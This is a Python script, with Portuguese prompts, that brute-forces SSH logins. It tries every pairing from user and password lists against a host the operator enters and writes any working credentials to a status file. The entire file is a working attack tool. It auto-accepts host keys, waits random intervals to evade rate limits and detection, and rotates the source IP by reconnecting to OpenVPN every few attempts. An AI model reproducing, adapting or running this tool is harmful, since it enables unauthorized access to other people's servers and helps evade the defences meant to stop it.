import pexpect
import random
import passwords
import time
import vpn
import users
from pathlib import Path

passwordsl = passwords.load_passwords()
usersl = users.load_users()
openvpn_enter = vpn.openvpn_enter_()

finded = False

j = 0

KEY_CONFIRMATION = "key_confirmation"
FIRST_PASSWORD = "first_password"
PASSWORD = "password"
SHELL = "shell"
DENIED = "denied"
END = "end"
TIMEOUT = "timeout"
SSH_TIMEOUT = 30


def update_status(line_number, value):
    status_file = Path("/tmp/status")
    with status_file.open("r", encoding="utf-8") as f:
        lines = f.readlines()
    while len(lines) <= line_number:
        lines.append("\n")
    lines[line_number] = f"{value}\n"
    temporary_file = status_file.with_suffix(".tmp")
    with temporary_file.open("w", encoding="utf-8") as f:
        f.writelines(lines)
    temporary_file.replace(status_file)


def expect_state(process, states):
    patterns = [pattern for _, pattern in states]
    try:
        result = process.expect(patterns)
    except pexpect.EOF:
        return END
    except pexpect.TIMEOUT:
        return TIMEOUT
    return states[result][0]

i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

host = str(input("Qual o destino: "))
port = str(input("Qual a porta: "))

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):
    
    update_status(1, i)

    while j < len(passwordsl):

        update_status(2, j)

        process = pexpect.spawn(
            "ssh",
            [f"{usersl[i]}@{host}", "-p", port],
            encoding="utf-8",
            timeout=SSH_TIMEOUT,
        )

        try:
            result = expect_state(process, [
                (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
                (FIRST_PASSWORD, r"\(.*\) Password:"),
                (PASSWORD, r"(?i)(?:password|senha):\s*"),
                (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                (DENIED, r"Permission denied"),
                (END, pexpect.EOF),
                (TIMEOUT, pexpect.TIMEOUT),
            ])

            if result == KEY_CONFIRMATION:
                print("Aceitando a chave do servidor...")
                process.sendline("yes")
                result = expect_state(process, [
                    (FIRST_PASSWORD, r"\(.*\) Password:"),
                    (PASSWORD, r"(?i)(?:password|senha):\s*"),
                    (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                    (DENIED, r"Permission denied"),
                    (END, pexpect.EOF),
                    (TIMEOUT, pexpect.TIMEOUT),
                ])

            while result in (FIRST_PASSWORD, PASSWORD):
                process.sendline(str(passwordsl[j]))
                result = expect_state(process, [
                    (PASSWORD, r"(?i)(?:password|senha):\s*"),
                    (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                    (DENIED, r"Permission denied"),
                    (END, pexpect.EOF),
                    (TIMEOUT, pexpect.TIMEOUT),
                ])
        except pexpect.EOF:
            result = END
        except pexpect.TIMEOUT:
            result = TIMEOUT

        if result == SHELL:
            user1 = usersl[i]
            password = passwordsl[j]

            print(user1)
            print(password)

            process.close()

            finded = True

            update_status(3, "True")
            update_status(5, user1)
            update_status(6, password)

            break

        if result == DENIED:
            print("Permissão negada.")
        elif result == END:
            print("A conexão foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite atingido.")
            
        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 10)
        time.sleep(delay)

        if result in (END, TIMEOUT):
            tries_exceeded += 1

            if tries_exceeded >= 15:
                update_status(4, "Muitas tentativas falhadas. Arquivo encerrado")

                print("Muitas tentativas falhadas. Encerrando...")
                process.close()
                break

            process.close()
            continue

        tries_exceeded = 0
        process.close()
        
        if j >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        j += 1

    if tries_exceeded >= 15:
        break

    if finded == True:
        break

    i += 1
    j = 0

if not finded and tries_exceeded < 15:
    update_status(4, "Nenhuma combinação encontrada")

openvpn_enter.close()